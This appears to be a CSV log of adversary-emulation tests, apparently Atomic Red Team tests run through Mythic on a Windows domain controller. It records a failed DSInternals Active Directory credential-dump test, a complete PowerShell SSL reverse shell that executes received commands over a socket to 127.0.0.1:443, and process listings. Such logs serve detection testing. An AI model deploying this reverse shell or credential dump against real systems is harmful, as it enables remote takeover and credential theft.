command,timestamp,status,api,name,GUID,description,platform,executor,timeout,callback_id,output
https://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/
",['windows'],powershell,300,16,"Test Failed
ERROR: Cannot index into a null array.
ERROR: At line:5 char:5
ERROR: + if (-not $RequiredModule.ExportedCommands['DSInternals']) {echo 'Test ...
ERROR: +     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
ERROR:     + FullyQualifiedErrorId : NullArray
ERROR:  
"
None,None,Failed,mythic,Run DSInternals Get-ADReplAccount,a0bced08-3fc5-4d8b-93b7-e8344739376e,"The following Atomic will run Get-ADReplAccount from DSInternals.
Upon successful execution, domain and credentials will appear in stdout. 
[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellarParticle.
https://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/
",['windows'],None,300,16,"[-] Failed to satisfy prerequisites for Run DSInternals Get-ADReplAccount
	get_prereq_command: $RequiredModule = Get-Module -Name DSInternals -ListAvailable
if (-not $RequiredModule) {echo 'Test Failed'}
if (-not $RequiredModule.ExportedCommands['DSInternals']) {echo 'Test Failed'} else {echo ""Test Passed""}
"
"$server_ip = 127.0.0.1
$server_port = 443
$socket = New-Object Net.Sockets.TcpClient('127.0.0.1', '443')
$stream = $socket.GetStream()
$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
$sslStream.AuthenticateAsClient('fakedomain.example', $null, ""Tls12"", $false)
$writer = new-object System.IO.StreamWriter($sslStream)
$writer.Write('PS ' + (pwd).Path + '> ')
$writer.flush()
[byte[]]$bytes = 0..65535|%{0};
while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data | Out-String ) 2>&1;
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
",2024-09-05T18:55:10.69768,success,mythic,OpenSSL C2,21caf58e-87ad-440c-a6b8-3ac259964003,"Thanks to @OrOneEqualsOne for this quick C2 method.
This is to test to see if a C2 session can be established using an SSL socket.
More information about this technique, including how to set up the listener, can be found here:
https://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926

Upon successful execution, powershell will make a network connection to 127.0.0.1 over 443.
",['windows'],powershell,300,16,"ERROR: New-Object : Exception calling "".ctor"" with ""2"" argument(s): ""No connection could be made because 
ERROR: the target machine actively refused it 127.0.0.1:443""
ERROR: At line:5 char:11
ERROR: + $socket = New-Object Net.Sockets.TcpClient('127.0.0.1', '443')
ERROR: +           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : InvalidOperation: (:) [New-Object], MethodInvocationException
ERROR:     + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewOb 
ERROR:    jectCommand
ERROR:  
ERROR: You cannot call a method on a null-valued expression.
ERROR: At line:6 char:1
ERROR: + $stream = $socket.GetStream()
ERROR: + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
ERROR:  
ERROR: New-Object : Exception calling "".ctor"" with ""3"" argument(s): ""Value cannot be null.
ERROR: Parameter name: innerStream""
ERROR: At line:7 char:14
ERROR: + ... sslStream = New-Object System.Net.Security.SslStream($stream,$false,( ...
ERROR: +                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : InvalidOperation: (:) [New-Object], MethodInvocationException
ERROR:     + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewOb 
ERROR:    jectCommand
ERROR:  
ERROR: You cannot call a method on a null-valued expression.
ERROR: At line:8 char:1
ERROR: + $sslStream.AuthenticateAsClient('fakedomain.example', $null, ""Tls12"", ...
ERROR: + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
ERROR:  
ERROR: new-object : A constructor was not found. Cannot find an appropriate constructor for type 
ERROR: System.IO.StreamWriter.
ERROR: At line:9 char:11
ERROR: + $writer = new-object System.IO.StreamWriter($sslStream)
ERROR: +           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : ObjectNotFound: (:) [New-Object], PSArgumentException
ERROR:     + FullyQualifiedErrorId : CannotFindAppropriateCtor,Microsoft.PowerShell.Commands.NewObjectCom 
ERROR:    mand
ERROR:  
ERROR: You cannot call a method on a null-valued expression.
ERROR: At line:10 char:1
ERROR: + $writer.Write('PS ' + (pwd).Path + '> ')
ERROR: + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
ERROR:  
ERROR: You cannot call a method on a null-valued expression.
ERROR: At line:11 char:1
ERROR: + $writer.flush()
ERROR: + ~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
ERROR:  
ERROR: You cannot call a method on a null-valued expression.
ERROR: At line:13 char:8
ERROR: + while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
ERROR: +        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
ERROR:  
"
"tasklist
",2024-09-05T18:55:47.287358,success,mythic,Process Discovery - tasklist,c5806a4f-62b8-4900-980b-c7ec004e9908,"Utilize tasklist to identify processes.

Upon successful execution, cmd.exe will execute tasklist.exe to list processes. Output will be via stdout. 
",['windows'],shell,300,16,"
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          8 K
System                           4 Services                   0        120 K
Registry                       124 Services                   0     69,696 K
smss.exe                       340 Services                   0      1,240 K
csrss.exe                      460 Services                   0      6,152 K
csrss.exe                      544 RDP-Tcp#0                  1      6,300 K
winlogon.exe                   596 RDP-Tcp#0                  1     11,372 K
wininit.exe                    604 Services                   0      7,008 K
services.exe                   684 Services                   0      9,380 K
lsass.exe                      704 Services                   0     58,736 K
svchost.exe                    916 Services                   0     22,664 K
fontdrvhost.exe                964 RDP-Tcp#0                  1      4,964 K
fontdrvhost.exe                972 Services                   0      3,480 K
svchost.exe                    376 Services                   0     11,556 K
svchost.exe                    540 Services                   0     11,032 K
svchost.exe                   1100 Services                   0     75,188 K
svchost.exe                   1172 Services                   0     10,076 K
svchost.exe                   1272 Services                   0      5,436 K
svchost.exe                   1280 Services                   0      7,612 K
svchost.exe                   1292 Services                   0     12,164 K
svchost.exe                   1300 Services                   0      6,888 K
svchost.exe                   1380 Services                   0      9,116 K
svchost.exe                   1408 Services                   0      7,156 K
svchost.exe                   1440 Services                   0     22,840 K
svchost.exe                   1532 Services                   0     12,920 K
svchost.exe                   1540 Services                   0     11,412 K
svchost.exe                   1548 Services                   0      5,924 K
svchost.exe                   1556 Services                   0      8,064 K
svchost.exe                   1648 Services                   0      8,552 K
svchost.exe                   1712 Services                   0     19,332 K
svchost.exe                   1740 Services                   0      8,984 K
svchost.exe                   1764 Services                   0     12,924 K
svchost.exe                   1800 Services                   0     15,368 K
svchost.exe                   1828 Services                   0      6,944 K
svchost.exe                   1880 Services                   0      6,156 K
svchost.exe                   1944 Services                   0      9,376 K
svchost.exe                   1996 Services                   0      7,556 K
svchost.exe                   2036 Services                   0     11,376 K
svchost.exe                   2112 Services                   0     10,700 K
svchost.exe                   2232 Services                   0      9,184 K
svchost.exe                   2384 Services                   0      8,152 K
svchost.exe                   2536 Services                   0     10,796 K
svchost.exe                   2576 Services                   0      7,524 K
svchost.exe                   2600 Services                   0      9,956 K
dwm.exe                       2804 RDP-Tcp#0                  1     77,604 K
svchost.exe                   3044 Services                   0      7,196 K
svchost.exe                   2656 Services                   0      7,392 K
svchost.exe                    872 Services                   0      8,912 K
spoolsv.exe                   3108 Services                   0     16,560 K
svchost.exe                   3176 Services                   0     10,584 K
svchost.exe                   3184 Services                   0      5,568 K
svchost.exe                   3192 Services                   0     28,700 K
dns.exe                       3200 Services                   0    126,156 K
svchost.exe                   3240 Services                   0      6,720 K
svchost.exe                   3248 Services                   0     14,780 K
svchost.exe                   3268 Services                   0     18,112 K
svchost.exe                   3276 Services                   0      7,148 K
svchost.exe                   3288 Services                   0     11,884 K
svchost.exe                   3296 Services                   0     10,664 K
ismserv.exe                   3332 Services                   0      6,168 K
MsMpEng.exe                   3440 Services                   0    136,468 K
wlms.exe                      3448 Services                   0      3,572 K
dfsrs.exe                     3460 Services                   0     24,124 K
blnsvr.exe                    3480 Services                   0      8,120 K
qemu-ga.exe                   3524 Services                   0      9,620 K
dfssvc.exe                    3604 Services                   0      6,052 K
svchost.exe                   3644 Services                   0     13,152 K
Microsoft.ActiveDirectory     3760 Services                   0     46,492 K
vds.exe                       4184 Services                   0     11,424 K
AggregatorHost.exe            4316 Services                   0      4,676 K
WmiPrvSE.exe                  4532 Services                   0      9,372 K
svchost.exe                   2044 Services                   0     11,108 K
svchost.exe                   4592 Services                   0     14,360 K
WmiPrvSE.exe                  4428 Services                   0     13,104 K
svchost.exe                   5076 RDP-Tcp#0                  1     13,284 K
svchost.exe                   4208 RDP-Tcp#0                  1     28,716 K
taskhostw.exe                 4676 RDP-Tcp#0                  1     12,268 K
sihost.exe                    5032 RDP-Tcp#0                  1     27,560 K
svchost.exe                   5128 Services                   0      7,512 K
MicrosoftEdgeUpdate.exe       5168 Services                   0      2,464 K
svchost.exe                   5192 Services                   0     13,516 K
ctfmon.exe                    5212 RDP-Tcp#0                  1     15,380 K
svchost.exe                   5380 Services                   0     13,532 K
svchost.exe                   5500 Services                   0      8,500 K
explorer.exe                  5608 RDP-Tcp#0                  1    137,564 K
TextInputHost.exe             5856 RDP-Tcp#0                  1     43,632 K
StartMenuExperienceHost.e     5864 RDP-Tcp#0                  1     55,112 K
RuntimeBroker.exe             6036 RDP-Tcp#0                  1     15,376 K
SearchApp.exe                  680 RDP-Tcp#0                  1     64,764 K
RuntimeBroker.exe              784 RDP-Tcp#0                  1     21,536 K
csrss.exe                     3256 Console                    2      6,072 K
winlogon.exe                  3220 Console                    2      8,476 K
LogonUI.exe                   4468 Console                    2     45,168 K
fontdrvhost.exe               3864 Console                    2      3,520 K
dwm.exe                       2812 Console                    2     43,492 K
RuntimeBroker.exe             6184 RDP-Tcp#0                  1     14,196 K
WUDFHost.exe                  6272 Services                   0     37,132 K
rdpclip.exe                   6296 RDP-Tcp#0                  1     11,356 K
smartscreen.exe               7128 RDP-Tcp#0                  1     24,120 K
powershell.exe                6384 RDP-Tcp#0                  1     71,868 K
conhost.exe                   6440 RDP-Tcp#0                  1     16,416 K
taskhostw.exe                 6168 RDP-Tcp#0                  1     10,980 K
svchost.exe                   7004 Services                   0     15,464 K
msdtc.exe                     3088 Services                   0     10,432 K
svchost.exe                   3016 Services                   0     11,080 K
svchost.exe                   3656 Services                   0     14,156 K
svchost.exe                   3556 RDP-Tcp#0                  1     14,360 K
svchost.exe                   6500 Services                   0      9,120 K
apollo.exe                    5284 RDP-Tcp#0                  1    131,276 K
conhost.exe                   2608 RDP-Tcp#0                  1     17,768 K
cmd.exe                       5828 RDP-Tcp#0                  1      3,920 K
conhost.exe                   3720 RDP-Tcp#0                  1     14,356 K
tasklist.exe                   980 RDP-Tcp#0                  1      8,808 K
"
"Get-Process
",2024-09-05T18:55:59.472589,success,mythic,Process Discovery - Get-Process,3b3809b6-a54b-4f5b-8aff-cb51f2e97b34,"Utilize Get-Process PowerShell cmdlet to identify processes.

Upon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout. 
",['windows'],powershell,300,16,"
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                              
-------  ------    -----      -----     ------     --  -- -----------                              
     88       6      916       4676       0.02   4316   0 AggregatorHost                           
   1373      55   120608     140576       9.14   5284   1 apollo                                   
    160      10     1644       8180       0.00   3480   0 blnsvr                                   
    176      12     6904      17768       0.23   2608   1 conhost                                  
    174      12     3492      16416       0.13   6440   1 conhost                                  
    444      20     1864       6152       0.36    460   0 csrss                                    
    314      15     1932       6300       0.38    544   1 csrss                                    
    165      11     1780       6072       0.11   3256   2 csrss                                    
    383      15     3376      15340       0.16   5212   1 ctfmon                                   
    409      34    16116      24128       3.02   3460   0 dfsrs                                    
    138       8     1892       6052       0.02   3604   0 dfssvc                                   
   5394    6235   128680     126156       0.25   3200   0 dns                                      
    812      34    17728      77620       2.59   2804   1 dwm                                      
    713      27    17284      43516       0.19   2812   2 dwm                                      
   2125      87    41456     128420      36.86   5608   1 explorer                                 
     33       7     1844       4964       0.13    964   1 fontdrvhost                              
     33       6     1312       3480       0.00    972   0 fontdrvhost                              
     33       6     1244       3520       0.02   3864   2 fontdrvhost                              
      0       0       60          8                 0   0 Idle                                     
    155      13     2004       6168       0.00   3332   0 ismserv                                  
    455      26     9968      45168       0.17   4468   2 LogonUI                                  
   1927     243    60428      58744       1.97    704   0 lsass                                    
    441      37    37304      46536       0.61   3760   0 Microsoft.ActiveDirectory.WebServices    
    215      14     1920       2436       0.08   5168   0 MicrosoftEdgeUpdate                      
    233      14     2848      10472       0.06   3088   0 msdtc                                    
    482     183   201128     136520       3.41   3440   0 MsMpEng                                  
    783      31    60100      71904       0.83   6384   1 powershell                               
    174      11     2204       9620       0.00   3524   0 qemu-ga                                  
    322      13     2476      11372       0.33   6296   1 rdpclip                                  
      0       7     2976      69696       0.41    124   0 Registry                                 
    287      16     5008      21500       0.30    784   1 RuntimeBroker                            
    162      11     2356      15336       0.02   6036   1 RuntimeBroker                            
    233      13     2660      14156       0.25   6184   1 RuntimeBroker                            
    631      31    30020      64380       1.42    680   1 SearchApp                                
    571      12     4320       9368       0.59    684   0 services                                 
    499      17     5008      27528       0.41   5032   1 sihost                                   
    411      22     7960      24144       0.16   7128   1 smartscreen                              
     60       3     1076       1240       0.20    340   0 smss                                     
    460      22     5568      16560       0.11   3108   0 spoolsv                                  
    583      27    13520      55112       0.64   5864   1 StartMenuExperienceHost                  
    918      21     4996      11628       0.72    376   0 svchost                                  
    341      12     2680      11064       0.13    540   0 svchost                                  
    205      11     2252       8912       0.17    872   0 svchost                                  
   1006      20     6764      22656       0.39    916   0 svchost                                  
    891      30    65644      75156       2.16   1100   0 svchost                                  
    218      13     2128      10116       0.09   1172   0 svchost                                  
    108       8     1204       5436       0.02   1272   0 svchost                                  
    213      13     1736       7612       0.03   1280   0 svchost                                  
    183      10     1828      12204       0.03   1292   0 svchost                                  
    119      14     2604       6872       0.03   1300   0 svchost                                  
    268      16     2800       9012       0.17   1380   0 svchost                                  
    211      10     1892       7136       0.11   1408   0 svchost                                  
    367      14    18132      22828       0.67   1440   0 svchost                                  
    288      17     2892      12948       0.09   1532   0 svchost                                  
    208      12     2288      11500       0.05   1540   0 svchost                                  
    162       8     1264       5924       0.02   1548   0 svchost                                  
    174      10     1852       8064       0.06   1556   0 svchost                                  
    179      11     1904       8576       0.08   1648   0 svchost                                  
    430      33     9560      19300       0.48   1712   0 svchost                                  
    286      12     1992       9008       0.03   1740   0 svchost                                  
    193      13     2204      12948       0.05   1764   0 svchost                                  
    397      18     4940      15456       0.20   1800   0 svchost                                  
    151      10     1608       6944       0.03   1828   0 svchost                                  
    147       7     1364       6156       0.02   1880   0 svchost                                  
    216      12     2148       9376       0.06   1944   0 svchost                                  
    165      10     1728       7552       0.09   1996   0 svchost                                  
    371      14     3624      11376       0.13   2036   0 svchost                                  
    209      11     2484      11172       0.06   2044   0 svchost                                  
    364      15     2768      10724       0.09   2112   0 svchost                                  
    206      10     2296       9128       0.22   2232   0 svchost                                  
    175      10     1668       8132       0.05   2384   0 svchost                                  
    436      14     2852      10820       0.23   2536   0 svchost                                  
    178      10     1688       7524       0.05   2576   0 svchost                                  
    233      16     2200       9956       0.02   2600   0 svchost                                  
    162      11     1752       7392       0.06   2656   0 svchost                                  
    249      13     3796      11100       0.03   3016   0 svchost                                  
    119       8     1328       7196       0.02   3044   0 svchost                                  
    198      24     2716      10588       0.17   3176   0 svchost                                  
    106       8     1108       5568       0.00   3184   0 svchost                                  
    515      22    13744      28724       0.77   3192   0 svchost                                  
    133       9     1492       6720       0.05   3240   0 svchost                                  
    169      10     6412      14804       0.83   3248   0 svchost                                  
    443      16     8640      18092       0.78   3268   0 svchost                                  
    146      42     1620       7148       0.06   3276   0 svchost                                  
    137       9     1636      11924       0.05   3288   0 svchost                                  
    213      12     2476      10664       0.08   3296   0 svchost                                  
    172      11     2412      14416       0.05   3556   1 svchost                                  
    391      24     3512      13176       0.13   3644   0 svchost                                  
    264      20     7980      14228       0.14   3656   0 svchost                                  
    329      17     6016      28684       0.47   4208   1 svchost                                  
    178      14     6724      14388       0.08   4592   0 svchost                                  
    242      13     3080      13284       0.06   5076   1 svchost                                  
    170      10     1480       7476       0.00   5128   0 svchost                                  
    203      12     2724      13524       0.13   5192   0 svchost                                  
    247      14     2744      13440       0.09   5380   0 svchost                                  
    133       9     1664       8500       0.03   5500   0 svchost                                  
    179      12     2052       9152       0.05   6500   0 svchost                                  
    273      16     9332      15520       0.70   7004   0 svchost                                  
   2315       0       40        120      10.16      4   0 System                                   
